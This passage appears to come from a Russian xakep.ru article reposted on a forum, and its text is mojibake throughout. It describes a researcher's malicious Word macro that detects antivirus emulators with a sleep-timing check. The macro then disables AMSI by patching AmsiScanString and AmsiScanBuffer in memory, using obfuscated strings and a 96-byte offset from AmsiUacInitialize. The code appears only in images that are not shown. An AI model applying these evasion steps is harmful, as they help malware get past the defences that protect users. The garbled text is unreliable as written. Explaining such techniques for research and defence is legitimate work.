–ù–∞–∫–æ–Ω–µ—Ü, –ø—Ä–æ—Å—Ç–æ–π —Ç–µ—Å—Ç –Ω–∞ –≤—Ä–µ–º—è. –ö–æ–≥–¥–∞ —Å–∫—Ä–∏–ø—Ç –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –≤ —ç–º—É–ª—è—Ç–æ—Ä–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞, —Ç–æ—Ç –æ–±—ã—á–Ω–æ –ø—Ä–æ–ø—É—Å–∫–∞–µ—Ç —Ñ—Ä–∞–≥–º–µ–Ω—Ç—ã –∫–æ–¥–∞, –≤ –∫–æ—Ç–æ—Ä—ã—Ö —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–∞ –ø–∞—É–∑–∞ –∏–ª–∏ ¬´–∑–∞—Å—ã–ø–∞–Ω–∏–µ¬ª, –∏–Ω–∞—á–µ –ª—é–±—è—â–∏–µ ¬´–ø–æ—Å–ø–∞—Ç—å¬ª –º–∞–∫—Ä–æ–≤–∏—Ä—É—Å—ã –ø–æ–ø—Ä–æ—Å—Ç—É –∑–∞–≤–µ—Å—è—Ç –¥–≤–∏–∂–æ–∫. –ü–æ—ç—Ç–æ–º—É –ë—Ä–µ–Ω–¥–∞–Ω –ø—Ä–µ–¥–ª–æ–∂–∏–ª —Å–ª–µ–¥—É—é—â—É—é –Ω–µ—Ö–∏—Ç—Ä—É—é –ø—Ä–æ–≤–µ—Ä–∫—É: —Ñ–∏–∫—Å–∏—Ä—É–µ–º –∞–∫—Ç—É–∞–ª—å–Ω–æ–µ –≤—Ä–µ–º—è, ¬´—Å–ø–∏–º¬ª –¥–≤–µ —Å–µ–∫—É–Ω–¥—ã, –∞ –∑–∞—Ç–µ–º –ø—Ä–æ—Å—ã–ø–∞–µ–º—Å—è –∏ –≤–Ω–æ–≤—å —Ñ–∏–∫—Å–∏—Ä—É–µ–º –≤—Ä–µ–º—è. –ï—Å–ª–∏ —Ä–∞–∑–Ω–∏—Ü–∞ –º–µ–∂–¥—É –¥–≤—É–º—è —ç—Ç–∏–º–∏ –∑–Ω–∞—á–µ–Ω–∏—è–º–∏ —Å–æ—Å—Ç–∞–≤–∏—Ç –º–µ–Ω–µ–µ 2 —Å–µ–∫—É–Ω–¥, —Å–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ, –º—ã –≤ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω–æ–º –¥–≤–∏–∂–∫–µ. –í —ç—Ç–æ–º —Å–ª—É—á–∞–µ –ø–æ–¥–ø—Ä–æ–≥—Ä–∞–º–º–∞ —Ç–∞–∫–∂–µ –∑–∞–≤–µ—Ä—à–∞–µ—Ç—Å—è.<br />
<br />
–ï—Å–ª–∏ –≤—Å–µ —Ç—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∑–∞–≤–µ—Ä—à–∏–ª–∏—Å—å –ø–æ–ª–Ω—ã–º –∏ –±–µ–∑–æ–≥–æ–≤–æ—Ä–æ—á–Ω—ã–º —É—Å–ø–µ—Ö–æ–º, –º–∞–∫—Ä–æ—Å –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç –∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—é –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–≥–ª—è–¥–∏—Ç –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–∞–∫, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∞ —Å–ª–µ–¥—É—é—â–µ–º —Ä–∏—Å—É–Ω–∫–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="02.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26876%2F02.png&amp;hash=fed9cbb17b78da7814bc0126df782520" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../0290f0.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26876%2F02.png&amp;hash=fed9cbb17b78da7814bc0126df782520"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26876/02.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="02.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
<b>–ù–µ—Å–∫–æ–ª—å–∫–æ —Å–ª–æ–≤ –æ–± AMSI</b><br />
<br />
–í —Ö–æ–¥–µ —Å–≤–æ–∏—Ö —ç–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç–æ–≤ –ë—Ä–µ–Ω–¥–∞–Ω –û—Ä—Ç–∏–∑ –≤—ã—è—Å–Ω–∏–ª, —á—Ç–æ –ø–æ–Ω–∞—á–∞–ª—É –µ–≥–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –º–∞–∫—Ä–æ—Å —É—Å–ø–µ—à–Ω–æ –¥–µ—Ç–µ–∫—Ç–∏—Ä–æ–≤–∞–ª—Å—è —ç–≤—Ä–∏—Å—Ç–∏–∫–æ–π –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã—Ö –¥–≤–∏–∂–∫–æ–≤. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –Ω–µ—Å–º–æ—Ç—Ä—è –Ω–∞ –º–Ω–æ–≥–æ—á–∏—Å–ª–µ–Ω–Ω—ã–µ –ø–æ–ø—ã—Ç–∫–∏ –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—è –∑–∞–ø—É—Å—Ç–∏—Ç—å –º–∞–∫—Ä–æ—Å –ø—Ä–∏ –≤–∫–ª—é—á–µ–Ω–Ω–æ–π –∑–∞—â–∏—Ç–µ Windows Defender, —Å–∏—Å—Ç–µ–º–∞ —É–±–∏–≤–∞–ª–∞ —Å–∫—Ä–∏–ø—Ç. –ü–æ –∫–∞–∫–æ–π –∂–µ –ø—Ä–∏—á–∏–Ω–µ –º–∞–∫—Ä–æ—Å –ø–æ–º–µ—á–∞–ª—Å—è –∫–∞–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π? –í—Å–µ –¥–µ–ª–æ –≤ —Ç–æ–º, —á—Ç–æ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal" target="_blank" class="link link--external" rel="noopener">Anti-Malware Scan Interface (AMSI)</a> –∑–∞–≥–ª—è–¥—ã–≤–∞–µ—Ç –≤ —Å—Ü–µ–Ω–∞—Ä–∏–π VBA –∏ –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ—Ç –µ–≥–æ –ø–æ–≤–µ–¥–µ–Ω–∏–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="03.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26877%2F03.png&amp;hash=0e596ba51523093cdcb5e4a971275649" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../036c6e.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26877%2F03.png&amp;hash=0e596ba51523093cdcb5e4a971275649"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26877/03.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="03.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
AMSI ‚Äî —ç—Ç–æ —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã–π Microsoft –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏—Å–ø–æ—Å–æ–±–ª–µ–Ω –∫ —Ä–∞–±–æ—Ç–µ —Å –ª—é–±—ã–º–∏ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞–º–∏ –∏ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∏–º –∑–∞–ø—Ä–∞—à–∏–≤–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–æ—Ü–µ—Å—Å–∞—Ö, –ø—Ä–æ–∏—Å—Ö–æ–¥—è—â–∏—Ö –≤–æ –≤—Ä–µ–º—è –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–∞–º–º. –≠—Ç–æ –∑–Ω–∞—á–∏—Ç, —á—Ç–æ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—É –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è –¥–∞–∂–µ –±–µ—Å—Ñ–∞–π–ª–æ–≤—ã–µ —É–≥—Ä–æ–∑—ã, –Ω–∞–ø—Ä–∏–º–µ—Ä –∫–æ–º–∞–Ω–¥—ã PowerShell, –µ—Å–ª–∏ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å –≤—ã–∑—ã–≤–∞–µ—Ç AMSI. –ï—â–µ —ç—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ —Ç—ã –º–æ–∂–µ—à—å –∫–∞–∫ —É–≥–æ–¥–Ω–æ –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, –Ω–æ –∫–∞–∫ —Ç–æ–ª—å–∫–æ –æ–Ω–∞ –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä—É–µ—Ç—Å—è –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, AMSI –Ω–∞—á–Ω–µ—Ç –æ—Ç—Å–ª–µ–∂–∏–≤–∞—Ç—å –ø–æ–≤–µ–¥–µ–Ω–∏–µ –∫–æ–¥–∞.<br />
<br />
–ö–æ–≥–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø—ã—Ç–∞–µ—Ç—Å—è –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É –≤ PowerShell, AMSI —Å–Ω–∞—á–∞–ª–∞ –∑–∞–≥—Ä—É–∂–∞–µ—Ç, –∞ –∑–∞—Ç–µ–º –ø—Ä–æ–≤–µ—Ä—è–µ—Ç —ç—Ç—É –∫–æ–º–∞–Ω–¥—É. –ï—Å–ª–∏ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞—é—Ç—Å—è –∫–∞–∫–∏–µ‚Äë–ª–∏–±–æ —ç–ª–µ–º–µ–Ω—Ç—ã, –∫–æ—Ç–æ—Ä—ã–µ –æ–±—ã—á–Ω–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π, –≤ —á–∞—Å—Ç–Ω–æ—Å—Ç–∏, –≤—ã–∑–æ–≤—ã API Win32 –∏–ª–∏ COM (—Ç–æ –µ—Å—Ç—å, —Å—Ä–∞–±–∞—Ç—ã–≤–∞—é—Ç –∑–∞–ª–æ–∂–µ–Ω–Ω—ã–µ –≤  AMSI  ¬´—Ç—Ä–∏–≥–≥–µ—Ä—ã¬ª), —Ç–æ AMSI –ø—Ä–∏–æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å.<br />
<br />
–ù–∞ –∫–∞—Ä—Ç–∏–Ω–∫–µ –Ω–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω–æ, –∫–∞–∫ VBA –∏–Ω—Ç–µ–≥—Ä–∏—Ä—É–µ—Ç—Å—è —Å AMSI. –° —É—á–µ—Ç–æ–º –≤—Å–µ–≥–æ —ç—Ç–æ–≥–æ –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å —Å—Ç–∞–ª –∏—Å–∫–∞—Ç—å —Å–ø–æ—Å–æ–±—ã —É—Å–∫–æ–ª—å–∑–Ω—É—Ç—å –æ—Ç –ø—Ä–∏—Å—Ç–∞–ª—å–Ω–æ–≥–æ –≤–Ω–∏–º–∞–Ω–∏—è AMSI –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Å–∫—Ä–∏–ø—Ç–æ–≤ VBA –∏ PowerShell.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="04.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26878%2F04.png&amp;hash=a02d217f656f774b17a8aec7c743a7e4" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../04dea0.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26878%2F04.png&amp;hash=a02d217f656f774b17a8aec7c743a7e4"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26878/04.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="04.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
<b>–ò–º–ø–æ—Ä—Ç Windows API –≤ VBA</b><br />
<br />
–ù–∞—á–∞—Ç—å –ë—Ä–µ–Ω–¥–∞–Ω —Ä–µ—à–∏–ª —Å –∏–º–ø–æ—Ä—Ç–∞ —Ñ—É–Ω–∫—Ü–∏–π. –ß—Ç–æ–±—ã –ø—Ä–æ–ø–∞—Ç—á–∏—Ç—å AMSI –≤ –ø–∞–º—è—Ç–∏, –Ω–µ–æ–±—Ö–æ–¥–∏–º –¥–æ—Å—Ç—É–ø –∫ –Ω–µ–∫–æ—Ç–æ—Ä—ã–º –Ω–∏–∑–∫–æ—É—Ä–æ–≤–Ω–µ–≤—ã–º –±–∏–±–ª–∏–æ—Ç–µ–∫–∞–º –∏ —Ñ—É–Ω–∫—Ü–∏—è–º Windows. –í VBA —Ä–∞–∑—Ä–µ—à–µ–Ω–æ –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å API Windows –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ –º–∞–∫—Ä–æ—Å–µ. –¢–∞–∫–∞—è –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å —Ä–∞–¥–∏–∫–∞–ª—å–Ω–æ —Ä–∞—Å—à–∏—Ä—è–µ—Ç —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª VBA.<br />
<br />
–ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫, –≤—ã–∑—ã–≤–∞—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ API Windows –∏–∑ VBA, C#, PowerShell –∏ —Ç. –¥., –¥–æ–ª–∂–µ–Ω —Ö–æ—Ä–æ—à–µ–Ω—å–∫–æ –≤ –Ω–∏—Ö —Ä–∞–∑–æ–±—Ä–∞—Ç—å—Å—è, —á—Ç–æ–±—ã –≤—Å–µ —Å–¥–µ–ª–∞—Ç—å –ø—Ä–∞–≤–∏–ª—å–Ω–æ. –î–µ–ª–æ –≤ —Ç–æ–º, —á—Ç–æ –Ω–∞—Ç–∏–≤–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è —ç—Ç–∏—Ö —Ü–µ–ª–µ–π –≤ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏—Ö —è–∑—ã–∫–∞—Ö –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç. –ù–æ –≤–æ–æ—Ä—É–∂–∏–≤—à–∏—Å—å –Ω–µ–∫–æ—Ç–æ—Ä—ã–º–∏ ¬´–ø–æ–¥–≥–æ—Ç–æ–≤–∏—Ç–µ–ª—å–Ω—ã–º–∏ –∑–Ω–∞–Ω–∏—è–º–∏¬ª, –∑–∞–ø–æ–ª–Ω–∏—Ç—å —ç—Ç–∏ –ø—Ä–æ–±–µ–ª—ã –¥–æ–≤–æ–ª—å–Ω–æ –ª–µ–≥–∫–æ. –ö–æ–≥–¥–∞ —Ç—ã –∑–Ω–∞–µ—à—å, –∫–∞–∫–∏–µ API Windows —Ö–æ—á–µ—à—å –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å, –¥–ª—è –Ω–∞—á–∞–ª–∞ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –ø–æ–≥—É–≥–ª–∏ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â—É—é –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—é Microsoft. –¢–∞–º —Ç—ã –Ω–∞–π–¥–µ—à—å –ø–æ–¥—Ä–æ–±–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–µ–π —Ç–µ–±—è —Ñ—É–Ω–∫—Ü–∏–∏, –≤ —á–∞—Å—Ç–Ω–æ—Å—Ç–∏, –∫–∞–∫–æ–≤—ã –µ–µ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è, –∫–∞–∫–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –æ–Ω–∞ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç, –≤ –∫–∞–∫–æ–π DLL –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π —Ç–µ–±—è API –∏ —Ç. –¥. –¢–∞–∫ —Ç—ã –ø–æ–ª—É—á–∏—à—å –ø–æ‚Äë–Ω–∞—Å—Ç–æ—è—â–µ–º—É —Ö–æ—Ä–æ—à–µ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –æ —Å–æ–±—ã—Ç–∏—è—Ö, –ø—Ä–æ–∏—Å—Ö–æ–¥—è—â–∏—Ö ¬´–ø–æ–¥ –∫–∞–ø–æ—Ç–æ–º¬ª —Å–∫—Ä–∏–ø—Ç–∞.<br />
<br />
–ë—Ä–µ–Ω–¥–∞–Ω –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª –≤ —Å–≤–æ–µ–º –º–∞–∫—Ä–æ—Å–µ –æ–±—ä—è–≤–ª–µ–Ω–∏–µ PInvoke (Platform-Invoke, ¬´–ü–ª–∞—Ç—Ñ–æ—Ä–º–µ–Ω–Ω—ã–π –≤—ã–∑–æ–≤¬ª). PInvoke ‚Äì —ç—Ç–æ –∫–æ–ª–ª–µ–∫—Ü–∏—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–π –¥–ª—è –≤—ã–∑–æ–≤–∞ –Ω–∞—Ç–∏–≤–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π API Windows –∏–∑ —è–∑—ã–∫–æ–≤ –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏—è, –≤ –∫–æ—Ç–æ—Ä—ã—Ö –º–æ–∂–µ—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤–æ–≤–∞—Ç—å —Ç–∞–∫–æ–π –Ω–∏–∑–∫–æ—É—Ä–æ–≤–Ω–µ–≤—ã–π —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª. –û—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏ —Ä–∞–±–æ—Ç—ã —ç—Ç–æ–≥–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞ –ø–æ–¥—Ä–æ–±–Ω–æ –æ–ø–∏—Å–∞–Ω—ã <a href="https://pinvoke.net/" target="_blank" class="link link--external" rel="noopener">–≤–æ—Ç –Ω–∞ —ç—Ç–æ–º —Å–∞–π—Ç–µ</a>. –¢–∞–º –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –¥–µ–∫–ª–∞—Ä–∞—Ü–∏–∏ –¥–ª—è –∏–º–ø–æ—Ä—Ç–∞ API –≤ —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏ –Ω–∞ –≤—Å–µ —Å–ª—É—á–∞–∏ –∂–∏–∑–Ω–∏.<br />
<br />
<b>–û–±—Ö–æ–¥ AMSI</b><br />
<br />
–ò–º–ø–æ—Ä—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö API Windows –≤ VBA ‚Äî —ç—Ç–æ —Ç–æ–ª—å–∫–æ –ø–µ—Ä–≤—ã–π —à–∞–≥. –ß—Ç–æ–±—ã –ø—Ä–∏–¥—É–º–∞–Ω–Ω—ã–π –ë—Ä–µ–Ω–¥–∞–Ω–æ–º –û—Ä—Ç–∏–∑–æ–º —Å–∫—Ä–∏–ø—Ç —Ä–∞–±–æ—Ç–∞–ª, –Ω—É–∂–Ω–æ –æ–±–æ–π—Ç–∏ AMSI. –î–ª—è —ç—Ç–æ–≥–æ –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å —Ä–µ—à–∏–ª –ø—Ä–æ–ø–∞—Ç—á–∏—Ç—å AMSI –ø—Ä—è–º–æ –≤ –ø–∞–º—è—Ç–∏. –ê –∫–æ–Ω–∫—Ä–µ—Ç–Ω–µ–µ, –ø—Ä–æ–ø–∞—Ç—á–∏—Ç—å –ø–µ—Ä–≤—ã–µ –Ω–µ—Å–∫–æ–ª—å–∫–æ –±–∞–π—Ç–æ–≤ –≤ —Ñ—É–Ω–∫—Ü–∏—è—Ö AmsiScanBuffer –∏ AmsiScanString –∏–∑ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ Amsi.dll, –∑–∞–≥—Ä—É–∂–∞–µ–º–æ–π –∏–∑ –∑–∞–ø—É—â–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞. –≠—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏, –µ—Å–ª–∏ –≤–µ—Ä–∏—Ç—å –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft, –æ—Ç–≤–µ—á–∞—é—Ç –∑–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –±—É—Ñ–µ—Ä–∞ –≤ –ø–æ–∏—Å–∫–∞—Ö —Ö–∞—Ä–∞–∫—Ç–µ—Ä–Ω—ã—Ö –¥–ª—è –º–∞–ª–≤–∞—Ä–∏ —Å—Ç—Ä–æ–∫.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="05.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26879%2F05.png&amp;hash=dacee9c03c6809657d238b9b9287aa41" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../05de99.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26879%2F05.png&amp;hash=dacee9c03c6809657d238b9b9287aa41"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26879/05.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="05.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
–°–Ω–∞—á–∞–ª–∞ –æ–±—ä—è–≤–ª—è–µ—Ç—Å—è —Å–ø–∏—Å–æ–∫ —É–∫–∞–∑–∞—Ç–µ–ª–µ–π –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∞–¥—Ä–µ—Å–æ–≤ —Ñ—É–Ω–∫—Ü–∏–π. –ó–∞—Ç–µ–º –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π lib —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –∞–¥—Ä–µ—Å –∏–∑ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ amsi.dll, —ç—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –ø—Ä–∏ –ø–æ–º–æ—â–∏ –Ω–∞–ø—Ä–∞–≤–ª—è–µ–º–æ–≥–æ –∫ API Windows –≤—ã–∑–æ–≤–∞ LoadLib. –í—Å–µ —Å—Ç—Ä–æ–∫–∏ –≤ —ç—Ç–æ–º –ø–∞—Ç—á–µ –ø–∞–º—è—Ç–∏ AMSI –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω—ã. –ù–∞ –ø–µ—Ä–≤–æ–º —ç—Ç–∞–ø–µ –∞–≤—Ç–æ—Ä —Å–∫—Ä–∏–ø—Ç–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª –¥–ª—è —ç—Ç–æ–≥–æ —Ñ—É–Ω–∫—Ü–∏—é VBA Chr(), —á—Ç–æ–±—ã —Å–∫—Ä—ã—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–Ω—ã–µ —Å—Ç—Ä–æ–∫–∏ –≤—Ä–æ–¥–µ amsi.dLl –∏ AmsiUacInitialize.<br />
<br />
–ó–∞—Ç–µ–º –Ω—É–∂–Ω–æ –Ω–∞–π—Ç–∏, –≥–¥–µ –ª–µ–∂–∏—Ç —Ñ—É–Ω–∫—Ü–∏—è AmsiScanString. –î–ª—è —ç—Ç–æ–≥–æ –ë—Ä–µ–Ω–¥–∞–Ω –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª —Ñ—É–Ω–∫—Ü–∏—é Windows API GetProcAddress, –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–Ω—É—é –≤ GetPrAddr. –ü–æ—Å–∫–æ–ª—å–∫—É AMSI –µ—â–µ –Ω–µ –ø—Ä–æ–ø–∞—Ç—á–µ–Ω, –∞ –≤—Ä–µ–¥–æ–Ω–æ—Å—ã —á–∞—Å—Ç–æ –ø—ã—Ç–∞—é—Ç—Å—è –æ—Ç–∫–ª—é—á–∏—Ç—å –µ–≥–æ, –Ω–∞—Ü–µ–ª–∏–≤–∞—è—Å—å –Ω–∞ —Ñ—É–Ω–∫—Ü–∏–∏  AmsiScanString –∏ AmsiScanBuffer, –∞–≤—Ç–æ—Ä —Å–∫—Ä–∏–ø—Ç–∞ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ–π –∞–¥—Ä–µ—Å–∞—Ü–∏–µ–π –Ω–∞—á–∏–Ω–∞—è —Å —Ñ—É–Ω–∫—Ü–∏–∏ AmsiUacInitialize.<br />
<br />
–î–ª—è –Ω–∞—á–∞–ª–∞ –ë—Ä–µ–Ω–¥–∞–Ω –≤—ã—á–µ–ª 96 –∏–∑ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏ AmsiUacInitialize –∏ —Å–æ—Ö—Ä–∞–Ω–∏–ª —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π func_addr. –ó–∞—Ç–µ–º –≤—ã–∑–≤–∞–ª GetPrAddr —Å–æ —Å—Ç—Ä–æ–∫–∞–º–∏‚Äë–∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏, –ø–µ—Ä–≤–∞—è –∏–∑ –∫–æ—Ç–æ—Ä—ã—Ö ‚Äì —ç—Ç–æ –∞–¥—Ä–µ—Å amsi.dll, –∞ –≤—Ç–æ—Ä–∞—è ‚Äì —Å—Ç—Ä–æ–∫–∞ AmsiUacInitialize, –∫ –∫–æ—Ç–æ—Ä–æ–π –ø—Ä–∏–º–µ–Ω–µ–Ω–∞ –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è. –ó–∞—á–µ–º –≤—ã—á–∏—Ç–∞—Ç—å 96? –í—Å—ë –æ—á–µ–Ω—å –ø—Ä–æ—Å—Ç–æ: –ë—Ä–µ–Ω–¥–∞–Ω –ø—Ä–æ—à–µ–ª—Å—è –ø–æ –ø—Ä–æ—Ü–µ—Å—Å—É Microsoft Word –æ—Ç–ª–∞–¥—á–∏–∫–æ–º WinDbg –∏ –≤—ã—è—Å–Ω–∏–ª, —á—Ç–æ  –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏ AmsiScanString –æ—Ç—Å—Ç–æ–∏—Ç –Ω–∞ 96 –±–∞–π—Ç–æ–≤ –æ—Ç —Ñ—É–Ω–∫—Ü–∏–∏ AmsiUacInitialize.<br />
<br />
